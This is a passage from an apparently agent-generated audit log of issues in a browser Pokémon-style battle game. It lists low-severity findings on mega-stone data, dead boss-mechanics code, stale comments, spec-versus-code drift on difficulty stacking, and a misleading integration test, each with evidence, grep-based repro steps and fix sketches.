**Repro**: Audited every `makeBuild` caller. All six player-acquisition paths (Professor, wild catch incl. roaming-legendary `prepare` at 37975, boss-arc `_bossArcRollLegendary`, evolution, swap) wrap with `_withStoryPlayerGimmickGate`. The gate's consumer `_mechForGimmickRoll` (11400) ALSO requires `settings.mechanics.X` (synced from `sm.settings` by `applyMechanicsToSettings`), so a disabled mechanic never rolls even with the flag on. Enemy gimmicks gate via `_storyEnemyMechKeys`→`sm.unlockedGimmicks`. Cable Link (`_makePlayerLinkBuild` at 46970) is the SOLE deliberate exception (maintainer decision 2026-05-25, CHANGELOG-documented) — still bounded by `settings.mechanics`.

**Blast radius**: This is the most security-sensitive Tier-1 item and it is solid. No P0/P1 leak.

**Fix sketch**: None — positive confirmation. (The prior audit could not assess this because catch/boss-arc didn't exist yet.)

**Verification**: `grep -n "makeBuild" battle.html` cross-checked against gate wrapping — only Cable Link is intentionally ungated.

---

## <a id="ISSUE-291"></a> ISSUE-291: items.json defines 93 mega stones but the engine recognizes only 51 — 45 non-canonical stones are inert data

---
id: ISSUE-291
severity: P3
category: data
anchor_symbol: ALL_MEGA_STONES
current_line_hint: ~10667
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 47fd5985be47
confidence: high
status: open
---

**Title**: items.json defines 93 mega stones but the engine recognizes only 51 — 45 non-canonical stones are inert data

**Evidence**:
```js
// battle.html ~10667 — engine's authoritative mega-stone set (51 canonical + orbs/rusted)
const ALL_MEGA_STONES = new Set(['Red Orb','Blue Orb','Rusted Sword','Rusted Shield','Venusaurite', ... 'Crucibellite']);
// data/items.json carries 93 isMegaStone items, incl. fan/CAP stones with no MEGA_FORM_NAMES entry:
// Greninjite, Dragoninite, Heatranite, Magearnite, Zygardite, Raichunite X/Y, Absolite Z, ...
```

**Repro**: Collect `name` of every `items.json` entry with `megaStone:true` (93) and diff against the `ALL_MEGA_STONES`/`MEGA_FORM_NAMES` literals in `battle.html` (51 + 2 orbs + 2 rusted). 45 stones have no engine entry. None of the 45 appear in any `data/builds/*.json` item slot (verified), so they are currently unreachable.

**Blast radius**: None today — `_buildGimmickFromItem`-style logic gates MEGA on `isMegaStone(item) && MEGA_FORM_NAMES[item]` (battle.html ~12142), so an unrecognized stone never assigns a MEGA gimmick, and no build references one. Risk is latent: any future feature that grants/sells items.json mega stones (or a dex/item browser) would hand the player a stone that silently can't mega-evolve.

**Fix sketch**: Either prune the 45 non-canonical `megaStone` flags from `data/items.json` to match the engine's supported set, or (if these are intentionally retained as a Smogon/CAP export) add a comment/manifest noting that only the 51 in `ALL_MEGA_STONES` are functional and keep the gimmick gate as the single source of truth. No engine change needed.

**Verification**: `Object.values(items.json).filter(i=>i.megaStone).length` equals `ALL_MEGA_STONES.size` minus orbs/rusted (option A); or the gate at ~12142 demonstrably blocks an unmapped stone (option B) — confirm a mon given "Greninjite" never shows a MEGA badge.

---

## <a id="ISSUE-292"></a> ISSUE-292: Anomaly seeds are keyed by row ID but several land on mismatched event types vs their prose

---
id: ISSUE-292
severity: P3
category: data
anchor_symbol: ANOMALY_SEEDS
current_line_hint: ~42285
file: battle.html
agents: [story-mode-investigator]
fingerprint: e9994d066619
confidence: medium
status: open
---

**Title**: Anomaly seeds are keyed by row ID but several land on mismatched event types vs their prose

**Evidence**:
```js
const ANOMALY_SEEDS = { 7:"…'Welcome Back.'…", 14:"…Pokédex…YOUR handwriting…",
  30:"An Elite Trainer says, mid-fight: 'Tell The First we said hi.'", 49:"…starter's Pokédex entry…" };
// Row-id 30 = STORY_EVENTS_RAW[idx 30] is 'Gym Trainer 2' at City5 (NOT an Elite Trainer).
//   (Elite Trainer rows are id 34/42/48/49/56-58/60-63.) The seed prose says "An Elite Trainer says…".
// Seeds fire on processNextEvent for ANY type at that row id (no type check).
```

**Repro**: Row id 30 is a City5 Gym Trainer 2 fight, but the seed text attributes the line to "an Elite Trainer." The seed shows on the Gym Trainer encounter. Rows 7/14/49 are Basic-Trainer/route rows; 14's "Pokédex updates" and 49's "starter's Pokédex entry" are fine as ambient tips, but 30's speaker attribution is wrong for its row.

**Blast radius**: Minor flavor mismatch in the deliberate "The First" breadcrumb trail. Row 30's "Elite Trainer" attribution on a Gym Trainer fight is a small immersion break in one of only 4 career-once seeds.

**Fix sketch**: Move the row-30 seed to an actual Elite Trainer row id (e.g. 34 or 42), or reword it to not name the speaker's class. Confirm 7/14/49 land where their prose implies.

**Verification**: Each anomaly seed's prose matches the event type of the row it fires on.

---

## <a id="ISSUE-293"></a> ISSUE-293: Latent state-bleed: artifact battle-flags reset is behind an empty-artifacts early-return (same init-inside-guard shape as the fixed boss-bleed)

---
id: ISSUE-293
severity: P3
category: bug
anchor_symbol: applyArtifactBattleEffects
current_line_hint: ~55003
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 672996ea646e
confidence: medium
status: open
---

**Title**: Latent state-bleed: artifact battle-flags reset is behind an empty-artifacts early-return (same init-inside-guard shape as the fixed boss-bleed)

**Evidence**:
```js
function applyArtifactBattleEffects() {
    if (!sm.artifacts || !sm.artifacts.length) return;   // 55003 — EARLY RETURN
    const off = sm.artifactsDisabled || [];
    const active = id => sm.artifacts.includes(id) && !off.includes(id);
    // …flag reset/reassign lives BELOW the guard:
    state._heavyGravityHazardMult = 1;                   // 55015
    state._vampiricFangsActive = active('vampiricFangs'); // 55016 … _glassCannonPact 55076, etc.
}
```
`state` is the persistent module-level battle object; this is the ONLY reset path for the artifact flags (`_vampiricFangsActive`, `_glassCannonPact`, `_berserkerSerumActive`, `_chaosAmuletActive`, `_stagnationCoreActive`, `_reapersTollActive`, `_evioliteBlessing`, `_heavyGravityHazardMult`, `_typeAmplifier/Nullifier/MagnetizerType`). The just-landed startBattle isolation reset (17317-17323) clears the `_boss*`/`_healingWish`/`_lunarDance` flags but does NOT list any of these artifact flags. The flags are read by live damage/stat hooks (e.g. `_vampiricFangsActive` 24453/24577/24666, `_glassCannonPact` 24277, `_stagnationCoreActive` ×7, `_evioliteBlessing` 23541), so a stale `true` would corrupt a follow-up fight's damage exactly like the (now-fixed) boss-immunity bleed (ISSUE-068).

**Repro**: Not currently reachable at runtime. Grep confirms `sm.artifacts` only ever GROWS (`.push` at 51643) or resets to `[]` on a fresh run (35332/39475) — there is NO mid-run removal (`grep -nE 'sm\.artifacts\.(pop|splice|shift|filter)'` → 0 hits), so once a player owns ≥1 artifact `sm.artifacts.length` stays ≥1 and the 55003 early-return never fires again. The disable path keeps the entry in `sm.artifacts` (only pushes to `artifactsDisabled`), so `active()` correctly drives the reassignment. This is a LATENT hazard, not a live bug.

**Blast radius**: None today. It becomes a live damage-corruption bleed the moment any future feature removes an artifact from `sm.artifacts` (a "sell/refund relic", an arc that strips relics, a migration that prunes the list) — the no-artifact battle would then keep the prior fight's relic flags armed.

**Fix sketch**: Hoist the flag DEFAULTS above the early-return so they reset unconditionally (mirror the startBattle boss-bleed fix): move the `state._heavyGravityHazardMult = 1; state._vampiricFangsActive = false; …` zeroing before `if (!sm.artifacts || !sm.artifacts.length) return;`, then let the `active(...)` reassignments below set the live values when artifacts exist. Cheap, behavior-preserving for today's flows, removes the foot-gun.

**Verification**: Add a jsdom regression — equip an artifact, run a battle (flag true), set `sm.artifacts = []`, call `window._storyApplyArtifacts()`, assert every `state._*Active` is false / `_heavyGravityHazardMult === 1`.

---

## <a id="ISSUE-294"></a> ISSUE-294: `applyFoeDifficultyScaling`'s "additive league boost" comment narrates a fix that was never implemented

---
id: ISSUE-294
severity: P3
category: dx
anchor_symbol: applyFoeDifficultyScaling
current_line_hint: ~13244
file: battle.html
agents: [story-mode-investigator]
fingerprint: e02d0b455313
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `applyFoeDifficultyScaling`'s "additive league boost" comment narrates a fix that was never implemented

**Evidence**:
```js
// battle.html ~13244 (inside applyFoeDifficultyScaling)
// > League boost (E1-E4 / Champion / league Rival / post-HoF Mystery)
// > is stored as additive deltas on the mon by applyStoryLeagueFoeStatBoost
// > so difficulty and boss boost stack ADDITIVELY (not multiplicatively).
// > Stops the 1.30 × 1.40 = 1.82 cliff between Normal and Challenge.
const lb = mon._leagueStatBonus;        // always undefined
const hpMult = mult + (lb && lb.hp ? lb.hp : 0);  // collapses to: mult
```
The actual `applyStoryLeagueFoeStatBoost` (line 30729) mutates `mon.maxHp *= hpM` and **never** writes `mon._leagueStatBonus`. The two comments contradict each other:
- Line 13245: "stack additively"
- Line 30766: "applied BEFORE difficulty scaling, so hard/challenge mode stacks on top multiplicatively"

The code matches line 30766. The line 13244 comment is a description of an intended fix that was never landed.

**Repro**: `grep -nE "_leagueStatBonus" battle.html` returns exactly one hit (read site only).

**Blast radius**: Documentation-debt only — the stat code works, just not the way the comment describes. Any contributor reading the line-13244 block to understand how league boost interacts with difficulty will be misled.

**Fix sketch**: Pair with the P1 fingerprint above. Either (a) delete the additive comment & confirm the multiplicative behavior is intentional, or (b) finish implementing the additive merge by writing `_leagueStatBonus` in `applyStoryLeagueFoeStatBoost` instead of mutating `maxHp` directly.

**Verification**: After (a), the line-13244 comment matches the code reality. After (b), the P1 stack-multiplicatively bug is also resolved.

---

## <a id="ISSUE-295"></a> ISSUE-295: Spec §8 says league boost stacks multiplicatively with difficulty; code now stacks additively (the cliff was fixed)

---
id: ISSUE-295
severity: P3
category: inconsistency
anchor_symbol: applyFoeDifficultyScaling
current_line_hint: ~14733
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7e1cdcbb0b91
confidence: high
status: open
---

**Title**: Spec §8 says league boost stacks multiplicatively with difficulty; code now stacks additively (the cliff was fixed)

**Evidence**:
```js
// League boost ... stored as additive deltas on the mon ... so difficulty and
// boss boost stack ADDITIVELY (not multiplicatively).
// Stops the 1.30 × 1.40 = 1.82 cliff between Normal and Challenge.
const hpMult   = mult + (lb && lb.hp   ? lb.hp   : 0);
```
STORY_MODE_FLOW.md §8 line 195 still states "applied before applyFoeDifficultyScaling, so the two stack multiplicatively. Champion HP on Hard ≈ ×1.30 × ×1.15 = ×1.495." The code explicitly switched to additive to kill that cliff — resolving prior-audit balance item 2.5. Spec is now stale on this point.

**Repro**: Static — §8 vs the additive `mult + lb.hp` formula.

**Blast radius**: Doc accuracy; the additive behavior is the correct/intended one. Important because §8 is cited as canon for difficulty tuning.

**Fix sketch**: Update §8 to document additive stacking and the new effective multipliers (maxwell territory).

**Verification**: Spec §8 matches `applyFoeDifficultyScaling`.

---

## <a id="ISSUE-296"></a> ISSUE-296: Spec §8 says league boost stacks MULTIPLICATIVELY with difficulty; code now stacks ADDITIVELY

---
id: ISSUE-296
severity: P3
category: inconsistency
anchor_symbol: applyStoryLeagueFoeStatBoost
current_line_hint: ~32108
file: battle.html
agents: [story-mode-investigator]
fingerprint: 25cb66b09cd0
confidence: high
status: open
---

**Title**: Spec §8 says league boost stacks MULTIPLICATIVELY with difficulty; code now stacks ADDITIVELY

**Evidence**:
```js
// battle.html:32108 — league boost stored as ADDITIVE delta
// "...so applyFoeDifficultyScaling can merge with the difficulty multiplier
//  additively (e.g., Challenge 1.30 + Champion 0.40 = 1.70, not the
//  multiplicative 1.30 × 1.40 = 1.82 cliff)."
mon._leagueStatBonus = { hp: hpM-1, bulk: bulkM-1, spe: speM-1 };
```

**Repro**: STORY_MODE_FLOW §8 still reads "applyStoryLeagueFoeStatBoost … is applied before applyFoeDifficultyScaling, so the two stack multiplicatively. Champion HP on Hard ≈ ×1.30 × ×1.15 = ×1.495." The code (32108–32122) was reworked to additive merging — this directly FIXES prior audit finding 2.5 (the +56% vs +20% cliff). The spec doc was not updated.

**Blast radius**: Spec-vs-code only; the code is the better behavior. STORY_MODE_FLOW §15c/15e also describe Crucible Hard Mode stacking that should be reconciled with §8.

**Fix sketch**: Update STORY_MODE_FLOW §8 to describe the additive merge and remove the "×1.495" example.

**Verification**: Spec matches code's additive model.

---

## <a id="ISSUE-297"></a> ISSUE-297: Magma/Aqua bosses flash the same telegraph banner twice in the first two turns

---
id: ISSUE-297
severity: P3
category: inconsistency
anchor_symbol: BOSS_CONFIGS
current_line_hint: ~41863
file: battle.html
agents: [consistency-auditor]
fingerprint: 68d5ed4fb32c
confidence: high
status: open
---

**Title**: Magma/Aqua bosses flash the same telegraph banner twice in the first two turns

**Evidence**:
```js
'villain.magma.boss': { mechanics: [
  { type: 'fieldLock', ..., banner: 'PRIMAL HEAT' },      // fires turn-0 (battle init)
  { type: 'faintPhase', afterFaints: 0, ..., banner: 'PRIMAL HEAT' }, // fires turn 1→2
  ... ] }
// villain.aqua.boss is identical with 'PRIMORDIAL RAIN' / 'PRIMORDIAL RAIN'.
```

**Repro**: Start the Team Magma (or Aqua) boss fight. `_storyBossMechanicsBattleInit` flashes "PRIMAL HEAT" on the weather lock at init, then the `afterFaints:0` surge phase telegraphs "PRIMAL HEAT" again one turn later — the same banner text twice in quick succession.

**Blast radius**: Cosmetic only (banner is a non-blocking fade via `_showBossBanner`). These are villain main-track bosses, so in-scope for Story polish; no other boss config repeats a banner.

**Fix sketch**: Give the `afterFaints:0` phase a distinct banner from the fieldLock banner (e.g. weather lock "PRIMAL HEAT", opening surge "ERUPTION BEGINS"), or suppress the turn-1 telegraph when its banner equals the just-shown init banner. Balance/boss-config is maxwell-adjacent — propose strings, do not edit.

**Verification**: Re-run the magma/aqua boss; confirm two different banners across init + first phase.

---

## <a id="ISSUE-298"></a> ISSUE-298: `BOSS_MECHANICS` stub object is dead (never called); its "engine wiring is a no-op" comment is now false

---
id: ISSUE-298
severity: P3
category: dx
anchor_symbol: BOSS_MECHANICS
current_line_hint: ~41798
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 13c765d6e38e
confidence: high
status: open
---

**Title**: `BOSS_MECHANICS` stub object is dead (never called); its "engine wiring is a no-op" comment is now false

**Evidence**:
```js
// battle.html ~41792
// … Engine wiring … lives in a polish PR. For now, each
// mechanic is a no-op that records its activation …
const BOSS_MECHANICS = { hpThresholdPhase(battle,…){ battle._mechanics.push(…) }, … };
```

**Repro**: `grep -nE 'BOSS_MECHANICS\b' battle.html` → only the declaration (41798) + a `window.StoryMode` getter (37437). Its methods push to `battle._mechanics`, which is read nowhere. The live boss wiring is `_storyBossMechanicsBattleInit` / `_storyBossMechanicsTurnTick` / `_applyBossPhaseEffect` (the "polish PR" already landed). The stub's comment claims mechanics are still no-ops, which is misleading.

**Blast radius**: A future maintainer may try to "finish" the no-op stub, not realizing the real engine already ships elsewhere — wasted effort / duplicate wiring risk.

**Fix sketch**: Remove the `BOSS_MECHANICS` stub + its `window.StoryMode` getter (verified unused by grep), or replace its comment to point at the live `_storyBossMechanics*` functions.

**Verification**: `grep -nE 'BOSS_MECHANICS\b' battle.html` returns no call sites; no comment claims boss mechanics are unimplemented no-ops.

---

## <a id="ISSUE-299"></a> ISSUE-299: `BOSS_MECHANICS` registry (`~42172`) is dead — pushes to `battle._mechanics`, which is never read

---
id: ISSUE-299
severity: P3
category: refactor
anchor_symbol: BOSS_MECHANICS
current_line_hint: ~42172
file: battle.html
agents: [story-mode-investigator]
fingerprint: 148e841da76f
confidence: high
status: open
---

**Title**: `BOSS_MECHANICS` registry (`~42172`) is dead — pushes to `battle._mechanics`, which is never read

**Evidence**:
```js
const BOSS_MECHANICS = {
    hpThresholdPhase(battle, ...) { battle._mechanics.push({...}); ... },
    immunityRound(battle, ...)   { battle._mechanics.push({...}); ... },
    fieldLock(battle, ...)       { battle._mechanics.push({...}); ... },
};
```
Grep: `BOSS_MECHANICS` is referenced only at its definition + a getter export (`~37773`). `battle._mechanics` / `state._mechanics` is WRITTEN only inside these three methods and READ nowhere. The live implementation uses a different field, `state._bossMechanics` (init `~42357`, tick `~42410`, consumed at damage step `24096`/`24357`).

**Repro**: `grep -nE "\._mechanics\b" battle.html` → only the 3 push sites inside BOSS_MECHANICS. `grep -nE "BOSS_MECHANICS\b"` → def + export only.

**Blast radius**: Pure dead code + a misleading public-surface getter. Confirms the older PR-5 stub registry was superseded by the PR-A live wiring (`_storyBossMechanics*` / `BOSS_CONFIGS`) and never removed.

**Fix sketch**: Delete `BOSS_MECHANICS` and its `get BOSS_MECHANICS()` export (`~37773`). The live path (`BOSS_CONFIGS` + `_storyBossMechanicsBattleInit`/`TurnTick`) is the sole real impl.

**Verification**: grep shows no `BOSS_MECHANICS` / `._mechanics` references; boss-beat battles still apply surge/immunity/field-lock (state._bossMechanics path unaffected).

---

## <a id="ISSUE-300"></a> ISSUE-300: Dead `build.tired` fatigue field still written/backfilled at 5 sites, read in zero gameplay paths

---
id: ISSUE-300
severity: P3
category: refactor
anchor_symbol: build.tired
current_line_hint: ~35131
file: battle.html
agents: [consistency-auditor]
fingerprint: 67a1e4cfc010
confidence: high
status: open
---

**Title**: Dead `build.tired` fatigue field still written/backfilled at 5 sites, read in zero gameplay paths

**Evidence**:
```js
if (typeof slot.build.tired !== 'number') slot.build.tired = 0;     // ~35131
if (typeof slot.build.tired !== 'number') slot.build.tired = 0;     // ~35775
slot.build.tired = Math.max(0, Math.min(3, slot.build.tired | 0));  // ~35776
if (typeof b.tired !== 'number') b.tired = 0;                       // ~44611
if (typeof build.tired !== 'number') build.tired = 0;              // ~45025
```

**Repro**: `grep -nE '\.tired\b' battle.html | grep -viE 'retired'` → the 5 write/backfill sites above plus 2 comments (15203, 44501). A read-only grep (`grep -nE '\.tired' | grep -vE "= 0|typeof|//"`) returns NOTHING — the field is never consumed by any stat, damage, or display path. The fatigue system was cut ("Path D") and `_storyApplyTiredness` is an inert no-op (~44518) with zero callers.

**Blast radius**: Self-contained. Save-schema field (`SAVE_VER`-owned per CLAUDE.md sensitive areas), so deletion of the backfill must coordinate with the migration owner. No gameplay behavior depends on it.

**Fix sketch**: Drop the 5 `build.tired` backfill/clamp writes and the uncalled `_storyApplyTiredness` no-op. The field can stay tolerated-on-load (ignored) without being actively re-written. Coordinate the schema touch with the save-owner since it lives under the migration umbrella.

**Verification**: `grep -nE '\.tired\b' battle.html | grep -viE 'retired'` returns only tolerated-on-read references (or zero). Existing-save load test still passes.

---

## <a id="ISSUE-301"></a> ISSUE-301: Extra-raid stat scaling compounds `_storyStatMult` × `_bossStatMult` × `_bossHpScale`; the doc comment omits `_storyStatMult`

---
id: ISSUE-301
severity: P3
category: inconsistency
anchor_symbol: buildPokemon
current_line_hint: ~15083
file: battle.html
agents: [story-mode-investigator]
fingerprint: 20628d0fad96
confidence: high
status: open
---

**Title**: Extra-raid stat scaling compounds `_storyStatMult` × `_bossStatMult` × `_bossHpScale`; the doc comment omits `_storyStatMult`

**Evidence**:
```js
// buildPokemon ~15086: "effective raid HP ≈ _bossStatMult × _bossHpScale × base
//  (at maxParty 6: 1.3 × 5 ≈ 6.5× base HP) ... Kept off _storyStatMult because
//  enterBattleEvent overwrites that field on every rolled team member."
```
But enterBattleEvent DOES stamp `_storyStatMult` on every `enemyTeam` member including the raid mon: `for (const s of enemyTeam) if (s && s.build) s.build._storyStatMult = _enemyMult;` (`~47230`). The raid team `[{name,build}]` from `_rollExtraRaidBossTeam` IS that `enemyTeam`. Both buildPokemon blocks (`~15072` storyStatMult, `~15092` bossStatMult) then run on the same mon.

**Repro**: static trace — `_rollExtraRaidBossTeam` sets `_bossStatMult=1.3`, `_bossHpScale=_bossHpScaleForKind('raid',6)=5`; `enterBattleEvent` (`~47230`) then sets `_storyStatMult=_storyEnemyStatMult(event,city,idx)` on the same build (no raid exclusion). buildPokemon applies all three.

**Blast radius**: A raid that fires on a late road carries the City +20% band, so real HP ≈ `1.2 × 1.3 × 5 ≈ 7.8× base` (not the documented 6.5×), and offensive stats ≈ `1.2 × 1.3 ≈ 1.56× base`. The number is user/maxwell-owned, but the in-code comment under-states actual difficulty — a reader tuning the raid from the comment would mis-estimate. Inconsistency between documented intent and behavior.

**Fix sketch**: Either (a) update the comment to state the true product (`_storyStatMult × _bossStatMult × _bossHpScale`), or (b) if the design wants the raid OFF the per-event band, exclude raid builds at `~47230` (`if (!s.build._bossStatMult)`). Maxwell sign-off on the number.

**Verification**: build a raid mon with all three flags and a city band; assert maxHp ratio matches whichever spec is chosen.

---

## <a id="ISSUE-302"></a> ISSUE-302: buyItem cheap-consumable path is unguarded but synchronous; only the confirm-gated branch can interleave

---
id: ISSUE-302
severity: P3
category: inconsistency
anchor_symbol: buyItem
current_line_hint: ~50053
file: battle.html
agents: [story-mode-investigator]
fingerprint: 54ba972f489e
confidence: medium
status: open
---

**Title**: buyItem cheap-consumable path is unguarded but synchronous; only the confirm-gated branch can interleave

**Evidence**:
```js
const needsConfirm = (st==='dept' && _isFeatured) || (!_isBall && price>=1500);
if (needsConfirm) { const ok = await _storyConfirmTutorChange(...); if(!ok) return; }
sm.gold -= price;
```

**Repro**: Cheap buys (balls, <1500G non-balls) run fully sync — single-threading prevents double-submit. Only the confirm branch yields control.

**Blast radius**: Low under current modal blocking; documented so the buyItem lock fix is scoped to the confirm-gated branch and this isn't read as an active exploit.

**Fix sketch**: Same interaction-lock wrapper as buyArtifact; no change to the sync path.

**Verification**: Two confirm-gated buys in one tick → second rejected by lock.

---

## <a id="ISSUE-303"></a> ISSUE-303: Achievements caged_god / r_caged_god are permanently unobtainable

---
id: ISSUE-303
severity: P3
category: data
anchor_symbol: caged_god
current_line_hint: ~34815
file: battle.html
agents: [story-mode-investigator]
fingerprint: 628362bfd5b2
confidence: high
status: fixed-claude/gracious-goodall-QFuQF
---

**Title**: Achievements caged_god / r_caged_god are permanently unobtainable

**Evidence**:
```js
{ id: 'caged_god',      cat: 'milestone',  name: 'The Caged God',   desc: 'Capture Subject Zero in the post-game boss arc.', icon: '🔮' },
```

`caged_god` (~34815) and `r_caged_god` (~34845) are only unlocked inside the dead bossMode catch branch (`_storyAchievementUnlock('caged_god')` at ~50982). Since the boss arc was cut in v24 and is unreachable (see related P0/P3), these two achievements can never be earned, leaving permanent gaps in the achievement list and any 100% completion metric.

**Repro**: Inspect the achievements registry; the only unlock site is the unreachable bossMode path at ~50982.

**Blast radius**: Achievement completion UI / metrics; cosmetic but visible to completionists.

**Fix sketch**: Remove both achievement entries (and their unlock calls) alongside the boss-arc cleanup, or repurpose them to a live post-game milestone (e.g. roaming-legendary capture).

**Verification**: Achievement list no longer contains caged_god / r_caged_god, or they map to a reachable trigger.

---

## <a id="ISSUE-304"></a> ISSUE-304: Roulette doc comment promises a color-row payout the code never pays

---
id: ISSUE-304
severity: P3
category: inconsistency
anchor_symbol: casinoRoulSpin
current_line_hint: ~51226
file: battle.html
agents: [story-mode-investigator]
fingerprint: 450dbd3ab949
confidence: high
status: open
---

**Title**: Roulette doc comment promises a color-row payout the code never pays

**Evidence**:
```js
//   • Color row (any cell of that color, 3 cells, by cell stake): resolved per-cell...
const winningStake = (_casinoUI.roul.stakes[winCell.id] | 0);
if (winningStake > 0) payout += winningStake * 11;   // ONLY direct cell hit
```

**Repro**: Compare casinoRoulSpin header (~51226) to the payout loop (~51400). No color-aggregation logic exists.

**Blast radius**: Stale comment; UI only stakes discrete cells so no player-facing payout bug. Misleads maintainers.

**Fix sketch**: Delete the color-row comment lines, or implement per-color aggregation if intended.

**Verification**: Comment matches code.

---

## <a id="ISSUE-305"></a> ISSUE-305: Integration test asserts stale "PC cap of 10" and never checks the real PC_BOX_CAP=30

---
id: ISSUE-305
severity: P3
category: dx
anchor_symbol: catch-system.test.js
current_line_hint: ~33
file: tests/integration/catch-system.test.js
agents: [story-mode-investigator]
fingerprint: 179018114bb7
confidence: high
status: open
---

**Title**: Integration test asserts stale "PC cap of 10" and never checks the real PC_BOX_CAP=30

**Evidence**:
```js
test('catch-system: PC cap of 10 is documented in STORY_MODE_FLOW.md', async () => {
  const flow = fs.readFileSync('STORY_MODE_FLOW.md', 'utf8');
  assert.match(flow, /cap\s+10|10\s+(slots|max|cap|mons)/i, 'spec must mention PC cap of 10');
});
```

**Repro**: `node --test tests/integration/catch-system.test.js`. The test passes, but the spec and code both now say cap 30 (`PC_BOX_CAP = 30`, STORY_MODE_FLOW.md "cap 30"). The test only matches because the spec retains historical "draft's 10" prose; it never reads the actual `PC_BOX_CAP` constant. This is false confidence — the test would not catch a real cap regression.

**Blast radius**: Test suite trustworthiness only (no shipping behavior). 

**Fix sketch**: Rename and re-point the test to assert the live `PC_BOX_CAP` value (load engine, read the constant) equals 30, and that the spec mentions cap 30.

**Verification**: Mutate `PC_BOX_CAP` locally; the corrected test should fail.

---

## <a id="ISSUE-306"></a> ISSUE-306: `sm.catchUnlocked` is written by migration + newStoryRun but never read anywhere

---
id: ISSUE-306
severity: P3
category: dx
anchor_symbol: catchUnlocked
current_line_hint: ~30597
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9facd1ec61ac
confidence: high
status: wontfix-sm.catchUnlocked-reserved-for-future-toggle-feature
---

**Title**: `sm.catchUnlocked` is written by migration + newStoryRun but never read anywhere

**Evidence**:
```bash
$ grep -nE "catchUnlocked" battle.html
30597:            if (typeof sm.catchUnlocked !== 'boolean') sm.catchUnlocked = false;
30672:                   catchUnlocked: false,         # sm default
33704:                catchUnlocked: false,            # newStoryRun
```
Three writes, zero reads.

`STORY_MODE_FLOW.md §10` documents the field as:
> `catchUnlocked: false, // toggles wild-route prompts; flipped on after first wild route entry or starter`

So the spec promised the field would gate something. The implementation never wired the read.

**Repro**: After v15+ migration, `sm.catchUnlocked` is always `false`. No code path observes the flag.

**Blast radius**: 4 bytes of save bloat per slot. Future contributors may assume the field gates something and add a guard, only to find it never flips.

**Fix sketch**: Either (a) remove the field from `sm` defaults + newStoryRun + migration; or (b) actually gate the wild-route catch prompt on it (with the side-effect that pre-v15-then-restored saves never see the prompt fire). Option (a) is the cheap fix.

**Verification**: After (a), `grep -nE "catchUnlocked" battle.html` returns 0.

---

## <a id="ISSUE-307"></a> ISSUE-307: sm.catchUnlocked written by defaults + v15 migration + newStoryRun but read nowhere (live gate is sm.catchTutorialDone)

---
id: ISSUE-307
severity: P3
category: dx
anchor_symbol: catchUnlocked
current_line_hint: ~35349
file: battle.html
agents: [story-mode-investigator]
fingerprint: a461bb932f94
confidence: high
status: open
---

**Title**: sm.catchUnlocked written by defaults + v15 migration + newStoryRun but read nowhere (live gate is sm.catchTutorialDone)

**Evidence**:
```js
catchUnlocked: false,                  // sm defaults @35349, newStoryRun @39516
if (typeof sm.catchUnlocked !== 'boolean') sm.catchUnlocked = false;  // v15 migrate
// grep: 0 reads. Spec §10 marks it RESERVED/LEGACY ("written but never read").
```

**Repro**: `grep -n catchUnlocked battle.html` → 3 writes, 0 branches. Confirms ISSUE-250.

**Blast radius**: None functional — it's documented dead state. Flagged so it isn't mistaken for a live gate; the catch/route gate is `sm.catchTutorialDone`. The spec already calls it out, so this is a "leave-it-or-delete-it" cleanup, not a bug.

**Fix sketch**: Optional — delete the field + its three writes, or keep per the spec's RESERVED note. No behavior change either way.

**Verification**: After removal, no reference remains and the catch flow (gated on `catchTutorialDone`) is unaffected.

---

## <a id="ISSUE-308"></a> ISSUE-308: CHAMPION_VICTORY_LINES['Hau'] is dead — Hau is an Elite Trainer, never a Champion

---
id: ISSUE-308
severity: P3
category: inconsistency
anchor_symbol: CHAMPION_VICTORY_LINES
current_line_hint: ~29723
file: battle.html
agents: [consistency-auditor]
fingerprint: 743b2b45931a
confidence: high
status: open
---

**Title**: CHAMPION_VICTORY_LINES['Hau'] is dead — Hau is an Elite Trainer, never a Champion

**Evidence**:
```js
// CHAMPION_VICTORY_LINES (line ~29723):
'Hau':"Hau: \"Alola! You're a malasada-sweet Champion now!\"",
// but Hau's only TRAINER_DATA row (line ~29049) is role 'Elite Trainer':
{ role:'Elite Trainer', name:'Hau', type:'Normal', sigs:[...], spriteFile:'Hau' },
```

**Repro**: `node -e` cross-reference of CHAMPION_VICTORY_LINES keys vs. `role:'Champion'` names in TRAINER_DATA — "Hau" appears in the victory-line table but is not a Champion-role trainer. The Champion slot is filled only by `t.role === 'Champion'` (selectTrainerForRole / find-by-name guards), so showVictoryOverlay's Champion branch can never look up Hau.

**Blast radius**: Dead string only — no player will ever see it. Harmless, but it is misleading to future authors (implies Hau can be the Champion) and inflates the pool. Note the inverse is clean: every actual Champion (Blue, Lance, Steven Stone, Wallace, Cynthia, Alder, Iris, Diantha, Prof. Kukui, Leon, Geeta, Red) has both an intro pool and a victory line.

**Fix sketch**: Either remove the Hau entry from CHAMPION_VICTORY_LINES, or — if Hau is intended as a future Champion — add a `role:'Champion'` Hau row to TRAINER_DATA. Removing is the lower-risk option.

**Verification**: Re-run the keys-vs-roster cross-reference; CHAMPION_VICTORY_LINES should have no keys outside the Champion roster.

---

## <a id="ISSUE-309"></a> ISSUE-309: CHANGELOG 2026-05-21 entry claims Cable Link is ungated but the implementation in v18 explicitly gates it

---
id: ISSUE-309
severity: P3
category: inconsistency
anchor_symbol: CHANGELOG
current_line_hint: ~22
file: CHANGELOG.md
agents: [story-mode-investigator]
fingerprint: f7bb006d3e94
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: CHANGELOG 2026-05-21 entry claims Cable Link is ungated but the implementation in v18 explicitly gates it

**Evidence**:
```
CHANGELOG.md (lines 23-27):
> Cable Link is deliberately left ungated — its premium "another
> trainer's mon" vibe (high reroll cost, can surface pre-unlock
> gimmicks) is the only sanctioned shortcut.

STORY_MODE_FLOW.md §15d (line 712-715):
> The shared helper preserves the existing player gimmick gating
> (_pbsStoryUsePlayerGimmickGate) — Cable Link only rolls gimmicks
> the player has unlocked via gym victories.

battle.html ~42374 _makePlayerLinkBuild:
> [explicitly applies the gate; see fingerprint 4b6cce4cb746]
```
Three sources, two stories. CHANGELOG says ungated, spec says gated, code matches the spec. The CHANGELOG description of the unlock-gate-closed pass is wrong/stale.

